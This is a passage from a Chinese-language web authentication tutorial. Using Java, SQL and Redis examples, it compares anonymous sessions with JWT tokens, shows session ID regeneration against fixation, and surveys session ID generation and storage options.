<pre><code>/**\n * \u533a\u5206\u533f\u540dSession\u548c\u767b\u5f55Session\n */\n@Service\npublic class SessionService {\n\n    /**\n     * \u68c0\u67e5\u7528\u6237\u662f\u5426\u5df2\u767b\u5f55\n     */\n    public boolean isAuthenticated(HttpSession session) {\n        if (session == null) {\n            return false;\n        }\n\n        // \u68c0\u67e5Session\u4e2d\u662f\u5426\u6709\u7528\u6237\u4fe1\u606f\n        User user = (User) session.getAttribute(\"user\");\n        return user != null;\n    }\n\n    /**\n     * \u533f\u540dSession\u4f7f\u7528\u573a\u666f\uff1a\u672a\u767b\u5f55\u7684\u8d2d\u7269\u8f66\n     */\n    public void addToCart(HttpSession session, Product product) {\n        // \u5373\u4f7f\u672a\u767b\u5f55\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528Session\u5b58\u50a8\u8d2d\u7269\u8f66\n        List&lt;Product&gt; cart = (List) session.getAttribute(\"cart\");\n        if (cart == null) {\n            cart = new ArrayList&lt;&gt;();\n            session.setAttribute(\"cart\", cart);\n        }\n        cart.add(product);\n    }\n\n    /**\n     * \u767b\u5f55\u540e\u8f6c\u6362\u4e3a\u8ba4\u8bc1Session\n     */\n    public void login(HttpServletRequest request, User user) {\n        // 1. \u83b7\u53d6\u6216\u521b\u5efaSession\n        HttpSession session = request.getSession(true);\n\n        // 2. \u4fdd\u5b58\u65e7\u7684\u533f\u540d\u6570\u636e\uff08\u8d2d\u7269\u8f66\uff09\n        List&lt;Product&gt; anonymousCart = (List) session.getAttribute(\"cart\");\n\n        // 3. \u91cd\u65b0\u751f\u6210SessionID\uff08\u9632\u6b62Session\u56fa\u5b9a\u653b\u51fb\uff09\n        request.changeSessionId();\n\n        // 4. \u8bbe\u7f6e\u7528\u6237\u4fe1\u606f\uff08Session\u4ece\u533f\u540d\u53d8\u4e3a\u8ba4\u8bc1\uff09\n        session.setAttribute(\"user\", user);\n\n        // 5. \u6062\u590d\u8d2d\u7269\u8f66\u6570\u636e\n        if (anonymousCart != null) {\n            session.setAttribute(\"cart\", anonymousCart);\n        }\n\n        log.info(\"User {} logged in, session converted from anonymous to authenticated\", \n                 user.getUsername());\n    }\n}\n</code></pre> <p>\u5b9e\u9645\u573a\u666f\u6d41\u7a0b\uff1a</p> <pre><code>\u7535\u5546\u7f51\u7ad9Session\u751f\u547d\u5468\u671f\uff1a\n\n1. \u7528\u6237\u6253\u5f00\u7f51\u7ad9\uff08\u672a\u767b\u5f55\uff09\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 \u521b\u5efa\u533f\u540dSession                  \u2502\n   \u2502 SessionID: abc123               \u2502\n   \u2502 Data: { cart: [] }              \u2502  \u2190 \u53ef\u4ee5\u5b58\u50a8\u8d2d\u7269\u8f66\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n2. \u7528\u6237\u6d4f\u89c8\u5e76\u6dfb\u52a0\u5546\u54c1\u5230\u8d2d\u7269\u8f66\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 SessionID: abc123               \u2502\n   \u2502 Data: {                         \u2502\n   \u2502   cart: [\u5546\u54c1A, \u5546\u54c1B]          \u2502  \u2190 \u672a\u767b\u5f55\u4e5f\u80fd\u8d2d\u7269\n   \u2502 }                               \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n3. \u7528\u6237\u70b9\u51fb\"\u7ed3\u7b97\"\uff0c\u8df3\u8f6c\u5230\u767b\u5f55\u9875\n\n4. \u7528\u6237\u767b\u5f55\u6210\u529f\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 SessionID: xyz789 (\u91cd\u65b0\u751f\u6210)     \u2502  \u2190 \u9632\u6b62Session\u56fa\u5b9a\u653b\u51fb\n   \u2502 Data: {                         \u2502\n   \u2502   user: { id: 1001, ... },     \u2502  \u2190 \u6dfb\u52a0\u7528\u6237\u4fe1\u606f\n   \u2502   cart: [\u5546\u54c1A, \u5546\u54c1B]          \u2502  \u2190 \u4fdd\u7559\u8d2d\u7269\u8f66\u6570\u636e\n   \u2502 }                               \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n5. \u7528\u6237\u5b8c\u6210\u7ed3\u7b97\n   - Session\u7ee7\u7eed\u4f7f\u7528\n   - \u8d2d\u7269\u8f66\u6570\u636e\u53ef\u4ee5\u6e05\u7a7a\u6216\u4fdd\u7559\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#jwt-token","title":"JWT Token\u7684\u60c5\u51b5","text":"<p>\u7b54\u6848\uff1a\u4e0d\u4f1a\uff01\u672a\u767b\u5f55\u65f6\u4e0d\u751f\u6210JWT Token</p> <p>JWT Token\u53ea\u5728**\u767b\u5f55\u6210\u529f\u540e**\u624d\u751f\u6210\uff0c\u539f\u56e0\uff1a</p> <pre><code>JWT Token\u7279\u70b9\uff1a\n1. \u81ea\u5305\u542b\uff1aToken\u4e2d\u5305\u542b\u7528\u6237\u8eab\u4efd\u4fe1\u606f\uff08sub, username, roles\uff09\n2. \u6709\u7b7e\u540d\uff1a\u7b7e\u540d\u8bc1\u660e\u7528\u6237\u8eab\u4efd\u5df2\u88ab\u670d\u52a1\u5668\u9a8c\u8bc1\n3. \u6709\u8fc7\u671f\u65f6\u95f4\uff1a\u8868\u793a\u8ba4\u8bc1\u7684\u6709\u6548\u671f\n4. \u4ee3\u8868\u8ba4\u8bc1\u72b6\u6001\uff1aToken\u7684\u5b58\u5728\u672c\u8eab\u5c31\u8868\u793a\"\u5df2\u8ba4\u8bc1\"\n\n\u672a\u767b\u5f55\u7684\u7528\u6237\u6ca1\u6709\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\uff0c\u65e0\u6cd5\u751f\u6210\u6709\u6548\u7684JWT\uff01\n</code></pre> <p>\u6d41\u7a0b\u5bf9\u6bd4\uff1a</p> <pre><code>\u672a\u767b\u5f55\u7528\u6237\u8bbf\u95ee\u53d7\u4fdd\u62a4API\uff1a\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   \u5ba2\u6237\u7aef  \u2502                 \u2502   \u670d\u52a1\u5668  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                 \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                            \u2502\n     \u2502  GET /api/user/profile     \u2502\n     \u2502  (\u65e0Token)                 \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt; \u2502\n     \u2502                            \u2502\n     \u2502                            \u2502  \u68c0\u67e5Authorization Header\n     \u2502                            \u2502  \u2192 \u6ca1\u6709Token\n     \u2502                            \u2502  \u2192 \u65e0\u6cd5\u8bc6\u522b\u7528\u6237\u8eab\u4efd\n     \u2502                            \u2502\n     \u2502  401 Unauthorized          \u2502\n     \u2502  { \"error\": \"Authentication required\" }\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                            \u2502\n\n\u767b\u5f55\u540e\u83b7\u53d6Token\uff1a\n     \u2502                            \u2502\n     \u2502  POST /api/auth/login      \u2502\n     \u2502  {                         \u2502\n     \u2502    \"username\": \"zhang\",    \u2502\n     \u2502    \"password\": \"***\"       \u2502\n     \u2502  }                         \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt; \u2502\n     \u2502                            \u2502\n     \u2502                            \u2502  1. \u9a8c\u8bc1\u51ed\u8bc1\u6210\u529f\n     \u2502                            \u2502  2. \u751f\u6210JWT Token\n     \u2502                            \u2502     {\n     \u2502                            \u2502       \"sub\": \"1001\",\n     \u2502                            \u2502       \"username\": \"zhang\",\n     \u2502                            \u2502       \"roles\": [\"user\"],\n     \u2502                            \u2502       \"exp\": 1735689600\n     \u2502                            \u2502     }\n     \u2502                            \u2502  3. \u7b7e\u540dToken\n     \u2502                            \u2502\n     \u2502  200 OK                    \u2502\n     \u2502  {                         \u2502\n     \u2502    \"access_token\": \"eyJ...\",\n     \u2502    \"token_type\": \"Bearer\", \u2502\n     \u2502    \"expires_in\": 3600      \u2502\n     \u2502  }                         \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                            \u2502\n     \u2502  \u5ba2\u6237\u7aef\u4fdd\u5b58Token            \u2502\n     \u2502  (\u5185\u5b58/Cookie/Storage)     \u2502\n     \u2502                            \u2502\n     \u2502  GET /api/user/profile     \u2502\n     \u2502  Authorization: Bearer eyJ...\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt; \u2502\n     \u2502                            \u2502\n     \u2502                            \u2502  \u9a8c\u8bc1Token\u7b7e\u540d\n     \u2502                            \u2502  \u63d0\u53d6\u7528\u6237\u4fe1\u606f\n     \u2502                            \u2502  \u6267\u884c\u4e1a\u52a1\u903b\u8f91\n     \u2502                            \u2502\n     \u2502  200 OK                    \u2502\n     \u2502  { \"id\": 1001, ... }       \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n</code></pre> <p>RESTful API\u5b9e\u73b0\u793a\u4f8b\uff1a</p> <pre><code>@RestController\npublic class ApiController {\n\n    /**\n     * \u516c\u5f00\u63a5\u53e3\uff1a\u65e0\u9700Token\n     */\n    @GetMapping(\"/api/products\")\n    public List&lt;Product&gt; getProducts() {\n        // \u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4e0d\u9700\u8981Token\n        return productService.getAllProducts();\n    }\n\n    /**\n     * \u53d7\u4fdd\u62a4\u63a5\u53e3\uff1a\u5fc5\u987b\u6709Token\n     */\n    @GetMapping(\"/api/user/profile\")\n    public UserProfile getMyProfile(@RequestHeader(\"Authorization\") String authHeader) {\n        // 1. \u68c0\u67e5Token\u662f\u5426\u5b58\u5728\n        if (authHeader == null || !authHeader.startsWith(\"Bearer \")) {\n            throw new UnauthorizedException(\"Missing or invalid token\");\n        }\n\n        // 2. \u63d0\u53d6Token\n        String token = authHeader.substring(7);\n\n        // 3. \u9a8c\u8bc1Token\n        try {\n            Claims claims = jwtService.validateToken(token);\n            String userId = claims.getSubject();\n\n            // 4. \u4f7f\u7528Token\u4e2d\u7684\u7528\u6237\u4fe1\u606f\n            return userService.getProfile(userId);\n\n        } catch (JwtException e) {\n            throw new UnauthorizedException(\"Invalid token\");\n        }\n    }\n\n    /**\n     * \u767b\u5f55\u63a5\u53e3\uff1a\u751f\u6210Token\n     */\n    @PostMapping(\"/api/auth/login\")\n    public TokenResponse login(@RequestBody LoginRequest request) {\n        // 1. \u9a8c\u8bc1\u51ed\u8bc1\n        User user = authService.authenticate(\n            request.getUsername(), \n            request.getPassword()\n        );\n\n        if (user == null) {\n            throw new BadCredentialsException(\"Invalid credentials\");\n        }\n\n        // 2. \u53ea\u6709\u9a8c\u8bc1\u6210\u529f\u540e\u624d\u751f\u6210Token\n        String accessToken = jwtService.generateAccessToken(user);\n        String refreshToken = jwtService.generateRefreshToken(user);\n\n        // 3. \u8fd4\u56deToken\n        return new TokenResponse(\n            accessToken,\n            \"Bearer\",\n            3600,  // 1\u5c0f\u65f6\n            refreshToken\n        );\n    }\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_6","title":"\u5bf9\u6bd4\u603b\u7ed3","text":"\u7ef4\u5ea6 Session JWT Token \u672a\u767b\u5f55\u65f6 \u53ef\u80fd\u521b\u5efa\u533f\u540dSession \u4e0d\u4f1a\u751f\u6210Token \u751f\u6210\u65f6\u673a \u7b2c\u4e00\u6b21\u8bbf\u95ee\u6216\u767b\u5f55\u65f6 \u4ec5\u5728\u767b\u5f55\u6210\u529f\u540e \u672a\u767b\u5f55\u7528\u6237 \u53ef\u4ee5\u8ddf\u8e2a\uff08\u533f\u540dSession\uff09 \u65e0\u6cd5\u8ddf\u8e2a\uff08\u65e0Token\uff09 \u5178\u578b\u7528\u9014 \u8d2d\u7269\u8f66\u3001\u6d4f\u89c8\u5386\u53f2\u3001\u63a8\u8350 \u8ba4\u8bc1\u548c\u6388\u6743 \u5305\u542b\u4fe1\u606f \u53ef\u4ee5\u4e3a\u7a7a\u6216\u53ea\u6709\u533f\u540d\u6570\u636e \u5fc5\u987b\u5305\u542b\u7528\u6237\u8eab\u4efd \u670d\u52a1\u5668\u5b58\u50a8 \u9700\u8981\uff08\u5373\u4f7f\u533f\u540d\uff09 \u4e0d\u9700\u8981 \u8d44\u6e90\u5360\u7528 \u5360\u7528\uff08\u6bcf\u4e2a\u8bbf\u5ba2\u90fd\u6709\uff09 \u4e0d\u5360\u7528\uff08\u53ea\u6709\u767b\u5f55\u7528\u6237\uff09 <p>\u5173\u952e\u533a\u522b\uff1a</p> <pre><code>Session\uff1a\n\u2705 \u53ef\u4ee5\u5728\u672a\u767b\u5f55\u65f6\u521b\u5efa\uff08\u7528\u4e8e\u8ddf\u8e2a\u533f\u540d\u7528\u6237\uff09\n\u2705 \u767b\u5f55\u540e\u5728Session\u4e2d\u6dfb\u52a0\u7528\u6237\u4fe1\u606f\n\u2705 Session\u672c\u8eab\u662f\u5bb9\u5668\uff0c\u53ef\u4ee5\u5b58\u50a8\u4efb\u4f55\u6570\u636e\n\u2705 \u9002\u5408\u9700\u8981\u8ddf\u8e2a\u533f\u540d\u7528\u6237\u7684\u573a\u666f\n\nJWT Token\uff1a\n\u2705 \u53ea\u5728\u767b\u5f55\u6210\u529f\u540e\u751f\u6210\n\u2705 Token\u672c\u8eab\u5c31\u4ee3\u8868\"\u5df2\u8ba4\u8bc1\"\n\u2705 Token\u5fc5\u987b\u5305\u542b\u7528\u6237\u8eab\u4efd\u4fe1\u606f\n\u2705 \u9002\u5408\u7eafAPI\u8ba4\u8bc1\u573a\u666f\n</code></pre> <p>\u5b9e\u9645\u5e94\u7528\u5efa\u8bae\uff1a</p> <pre><code>\u573a\u666f1\uff1a\u9700\u8981\u8ddf\u8e2a\u533f\u540d\u7528\u6237\uff08\u7535\u5546\u3001\u793e\u4ea4\uff09\n\u63a8\u8350\uff1a\u4f7f\u7528Session\n\u539f\u56e0\uff1a\n- \u672a\u767b\u5f55\u7528\u6237\u4e5f\u9700\u8981\u8d2d\u7269\u8f66\n- \u9700\u8981\u8bb0\u5f55\u6d4f\u89c8\u5386\u53f2\u505a\u63a8\u8350\n- \u9700\u8981\u4fdd\u5b58\u7528\u6237\u504f\u597d\u8bbe\u7f6e\n\n\u573a\u666f2\uff1a\u7eafAPI\u8ba4\u8bc1\uff08\u79fb\u52a8App\u3001\u5fae\u670d\u52a1\uff09\n\u63a8\u8350\uff1a\u4f7f\u7528JWT\n\u539f\u56e0\uff1a\n- \u4e0d\u9700\u8981\u8ddf\u8e2a\u533f\u540d\u7528\u6237\n- \u53ea\u6709\u767b\u5f55\u7528\u6237\u624d\u80fd\u8bbf\u95eeAPI\n- \u65e0\u72b6\u6001\uff0c\u6613\u4e8e\u6269\u5c55\n\n\u573a\u666f3\uff1a\u6df7\u5408\u573a\u666f\uff08Web + Mobile\uff09\n\u63a8\u8350\uff1a\u7ec4\u5408\u4f7f\u7528\n- Web\u7aef\uff1a\u672a\u767b\u5f55\u7528LocalStorage/\u533f\u540dSession\n- \u767b\u5f55\u540e\uff1a\u751f\u6210JWT Token\n- \u8fc1\u79fb\u533f\u540d\u6570\u636e\u5230\u7528\u6237\u8d26\u6237\n</code></pre> <p>\u4ee3\u7801\u793a\u4f8b\uff1a\u6df7\u5408\u65b9\u6848</p> <pre><code>/**\n * \u6df7\u5408\u65b9\u6848\uff1a\u533f\u540d\u8d2d\u7269\u8f66 + JWT\u8ba4\u8bc1\n */\n@Service\npublic class HybridCartService {\n\n    /**\n     * \u672a\u767b\u5f55\uff1a\u4f7f\u7528\u533f\u540d\u6807\u8bc6\uff08\u5ba2\u6237\u7aef\u751f\u6210\u7684UUID\uff09\n     */\n    public void addToAnonymousCart(String anonymousId, Product product) {\n        // \u5b58\u50a8\u5728\u4e34\u65f6\u8868\u6216\u7f13\u5b58\u4e2d\n        String key = \"anonymous:cart:\" + anonymousId;\n        redis.sadd(key, product.getId());\n        redis.expire(key, 7, TimeUnit.DAYS);  // 7\u5929\u8fc7\u671f\n    }\n\n    /**\n     * \u767b\u5f55\uff1a\u751f\u6210JWT + \u8fc1\u79fb\u533f\u540d\u8d2d\u7269\u8f66\n     */\n    public TokenResponse loginAndMergeCart(String username, \n                                          String password, \n                                          String anonymousId) {\n        // 1. \u9a8c\u8bc1\u51ed\u8bc1\n        User user = authenticate(username, password);\n\n        // 2. \u751f\u6210JWT Token\n        String token = jwtService.generateToken(user);\n\n        // 3. \u8fc1\u79fb\u533f\u540d\u8d2d\u7269\u8f66\n        if (anonymousId != null) {\n            String anonymousKey = \"anonymous:cart:\" + anonymousId;\n            String userKey = \"user:cart:\" + user.getId();\n\n            // \u5408\u5e76\u8d2d\u7269\u8f66\u6570\u636e\n            Set&lt;String&gt; anonymousCart = redis.smembers(anonymousKey);\n            redis.sadd(userKey, anonymousCart.toArray(new String[0]));\n\n            // \u5220\u9664\u533f\u540d\u6570\u636e\n            redis.del(anonymousKey);\n        }\n\n        // 4. \u8fd4\u56deToken\n        return new TokenResponse(token);\n    }\n\n    /**\n     * \u767b\u5f55\u540e\uff1a\u4f7f\u7528JWT\u4e2d\u7684\u7528\u6237ID\n     */\n    public void addToUserCart(String jwtToken, Product product) {\n        // \u4eceToken\u4e2d\u63d0\u53d6\u7528\u6237ID\n        Claims claims = jwtService.validateToken(jwtToken);\n        String userId = claims.getSubject();\n\n        // \u5b58\u50a8\u5230\u7528\u6237\u8d2d\u7269\u8f66\n        String key = \"user:cart:\" + userId;\n        redis.sadd(key, product.getId());\n    }\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#14-sessionid","title":"1.4 SessionID\u751f\u6210\u7b97\u6cd5","text":"<p>\u5b89\u5168\u8981\u6c42\uff1a - \u968f\u673a\u6027\uff1a\u4e0d\u53ef\u9884\u6d4b - \u552f\u4e00\u6027\uff1a\u4e0d\u4f1a\u51b2\u7a81 - \u957f\u5ea6\u9002\u4e2d\uff1a32-128\u5b57\u7b26</p> <p>\u5e38\u7528\u751f\u6210\u65b9\u6cd5\uff1a <pre><code>\u65b9\u6cd51\uff1aUUID\uff08\u63a8\u8350\uff09\nsessionId = UUID.randomUUID().toString()\n\u793a\u4f8b\uff1a3f2504e0-4f89-41d3-9a0c-0305e82c3301\n\n\u65b9\u6cd52\uff1a\u5b89\u5168\u968f\u673a\u6570 + Base64\nbyte[] randomBytes = new byte[32];\nSecureRandom.getInstanceStrong().nextBytes(randomBytes);\nsessionId = Base64.getUrlEncoder().encodeToString(randomBytes)\n\u793a\u4f8b\uff1a5J2vM8kPqL9Xw3nF7hR4tY6uI1oP\n\n\u65b9\u6cd53\uff1a\u54c8\u5e0c\u7ec4\u5408\uff08\u589e\u5f3a\uff09\ndata = userId + timestamp + serverSecret + randomNumber\nsessionId = SHA256(data)\n\u793a\u4f8b\uff1aa7f3b9c2e1d4f8b5a6c3e2d1f9b8c7a6\n\n\u26a0\ufe0f \u9519\u8bef\u793a\u4f8b\uff08\u4e0d\u5b89\u5168\uff09\uff1a\nsessionId = userId + timestamp  // \u53ef\u9884\u6d4b\uff01\nsessionId = MD5(userId)         // \u53ef\u63a8\u6d4b\uff01\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#14-session","title":"1.4 Session\u5b58\u50a8\u65b9\u6848","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#1in-memory","title":"\u65b9\u68481\uff1a\u5185\u5b58\u5b58\u50a8\uff08In-Memory\uff09","text":"<p>**\u9002\u7528\u573a\u666f\uff1a**\u5355\u673a\u5e94\u7528\u3001\u5f00\u53d1\u6d4b\u8bd5\u73af\u5883</p> <p>\u5b9e\u73b0\u65b9\u5f0f\uff1a <pre><code>// \u4f7f\u7528ConcurrentHashMap\u5b58\u50a8\nprivate static final Map&lt;String, SessionData&gt; sessions = \n    new ConcurrentHashMap&lt;&gt;();\n\n// \u521b\u5efaSession\npublic String createSession(SessionData data) {\n    String sessionId = UUID.randomUUID().toString();\n    sessions.put(sessionId, data);\n    return sessionId;\n}\n\n// \u83b7\u53d6Session\npublic SessionData getSession(String sessionId) {\n    return sessions.get(sessionId);\n}\n\n// \u5220\u9664Session\npublic void removeSession(String sessionId) {\n    sessions.remove(sessionId);\n}\n</code></pre></p> <p>\u4f18\u70b9\uff1a - \u2705 \u6027\u80fd\u6700\u9ad8\uff0c\u76f4\u63a5\u5185\u5b58\u8bbf\u95ee - \u2705 \u5b9e\u73b0\u7b80\u5355 - \u2705 \u65e0\u9700\u989d\u5916\u7ec4\u4ef6</p> <p>\u7f3a\u70b9\uff1a - \u274c \u670d\u52a1\u5668\u91cd\u542fSession\u4e22\u5931 - \u274c \u4e0d\u652f\u6301\u5206\u5e03\u5f0f - \u274c \u5185\u5b58\u5360\u7528\u5927\uff08\u7528\u6237\u591a\u65f6\uff09 - \u274c \u65e0\u6cd5\u6301\u4e45\u5316</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#2database","title":"\u65b9\u68482\uff1a\u6570\u636e\u5e93\u5b58\u50a8\uff08Database\uff09","text":"<p>**\u9002\u7528\u573a\u666f\uff1a**\u9700\u8981\u6301\u4e45\u5316\u3001\u5ba1\u8ba1\u8981\u6c42\u9ad8</p> <p>\u8868\u7ed3\u6784\u8bbe\u8ba1\uff1a <pre><code>CREATE TABLE sessions (\n    session_id VARCHAR(64) PRIMARY KEY,\n    user_id BIGINT NOT NULL,\n    session_data TEXT,           -- JSON\u683c\u5f0f\u5b58\u50a8\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    last_accessed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    expires_at TIMESTAMP NOT NULL,\n    ip_address VARCHAR(45),\n    user_agent VARCHAR(255),\n    INDEX idx_user_id (user_id),\n    INDEX idx_expires_at (expires_at)\n);\n\n-- \u6e05\u7406\u8fc7\u671fSession\u7684\u5b9a\u65f6\u4efb\u52a1\nDELETE FROM sessions WHERE expires_at &lt; NOW();\n</code></pre></p> <p>\u4f18\u70b9\uff1a - \u2705 \u6570\u636e\u6301\u4e45\u5316\uff0c\u670d\u52a1\u5668\u91cd\u542f\u4e0d\u4e22\u5931 - \u2705 \u652f\u6301\u5ba1\u8ba1\u548c\u7edf\u8ba1 - \u2705 \u53ef\u4ee5\u67e5\u8be2\u7528\u6237\u7684\u6240\u6709Session</p> <p>\u7f3a\u70b9\uff1a - \u274c \u6027\u80fd\u8f83\u5dee\uff08\u78c1\u76d8I/O\uff09 - \u274c \u589e\u52a0\u6570\u636e\u5e93\u8d1f\u8f7d - \u274c \u9700\u8981\u5b9a\u671f\u6e05\u7406\u8fc7\u671f\u6570\u636e</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#3redis","title":"\u65b9\u68483\uff1aRedis\u5b58\u50a8\uff08\u63a8\u8350\u7528\u4e8e\u5206\u5e03\u5f0f\uff09","text":"<p>**\u9002\u7528\u573a\u666f\uff1a**\u5206\u5e03\u5f0f\u7cfb\u7edf\u3001\u9ad8\u5e76\u53d1\u573a\u666f</p> <p>\u5b9e\u73b0\u65b9\u5f0f\uff1a <pre><code>// \u5b58\u50a8Session\nSET session:abc123 \"{\\\"userId\\\":1001,\\\"username\\\":\\\"zhang\\\"}\" EX 1800\n\n// \u6570\u636e\u7ed3\u6784\nKey: session:{sessionId}\nValue: JSON\u683c\u5f0f\u7684Session\u6570\u636e\nTTL: 1800\u79d2\uff0830\u5206\u949f\uff09\n\n// \u8bfb\u53d6Session\nGET session:abc123\n\n// \u66f4\u65b0\u8fc7\u671f\u65f6\u95f4\uff08\u6ed1\u52a8\u8fc7\u671f\uff09\nEXPIRE session:abc123 1800\n\n// \u5220\u9664Session\uff08\u767b\u51fa\uff09\nDEL session:abc123\n\n// \u83b7\u53d6\u7528\u6237\u7684\u6240\u6709Session\uff08\u591a\u8bbe\u5907\u767b\u5f55\u7ba1\u7406\uff09\nKey\u6a21\u5f0f: session:user:{userId}:{deviceId}\nKEYS session:user:1001:*\n</code></pre></p> <p>\u4f18\u70b9\uff1a - \u2705 \u9ad8\u6027\u80fd\uff08\u5185\u5b58\u6570\u636e\u5e93\uff09 - \u2705 \u652f\u6301\u5206\u5e03\u5f0f - \u2705 \u81ea\u52a8\u8fc7\u671f\uff08TTL\uff09 - \u2705 \u652f\u6301\u96c6\u7fa4\u548c\u4e3b\u4ece\u590d\u5236 - \u2705 \u4e30\u5bcc\u7684\u6570\u636e\u7ed3\u6784</p> <p>\u7f3a\u70b9\uff1a - \u274c \u9700\u8981\u989d\u5916\u7684Redis\u670d\u52a1\u5668 - \u274c \u589e\u52a0\u67b6\u6784\u590d\u6742\u5ea6 - \u274c Redis\u5b95\u673a\u5f71\u54cd\u6240\u6709Session</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#15-session","title":"1.5 \u5206\u5e03\u5f0fSession\u89e3\u51b3\u65b9\u6848","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_7","title":"\u95ee\u9898\u573a\u666f\uff1a","text":"<pre><code>\u7528\u6237\u8bf7\u6c42\u53ef\u80fd\u8def\u7531\u5230\u4e0d\u540c\u670d\u52a1\u5668\uff1a\n\n\u8bf7\u6c421 \u2192 \u670d\u52a1\u5668A \u2192 \u521b\u5efaSession\n\u8bf7\u6c422 \u2192 \u670d\u52a1\u5668B \u2192 \u627e\u4e0d\u5230Session\uff08\u56e0\u4e3a\u5728A\u4e0a\uff09\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_8","title":"\u89e3\u51b3\u65b9\u6848\u5bf9\u6bd4\uff1a","text":"<p>\u65b9\u68481\uff1aSession\u7c98\u6ede\uff08Sticky Session\uff09</p> <pre><code>\u539f\u7406\uff1a\u901a\u8fc7\u8d1f\u8f7d\u5747\u8861\u5668\u786e\u4fdd\u540c\u4e00\u7528\u6237\u7684\u8bf7\u6c42\u603b\u662f\u8def\u7531\u5230\u540c\u4e00\u53f0\u670d\u52a1\u5668\n\n\u914d\u7f6e\u793a\u4f8b\uff08Nginx\uff09\uff1a\nupstream backend {\n    ip_hash;  # \u57fa\u4e8eIP\u54c8\u5e0c\n    server server1:8080;\n    server server2:8080;\n    server server3:8080;\n}\n\n\u6d41\u7a0b\uff1a\n\u5ba2\u6237\u7aefIP: 192.168.1.100 \u2192 \u54c8\u5e0c\u8ba1\u7b97 \u2192 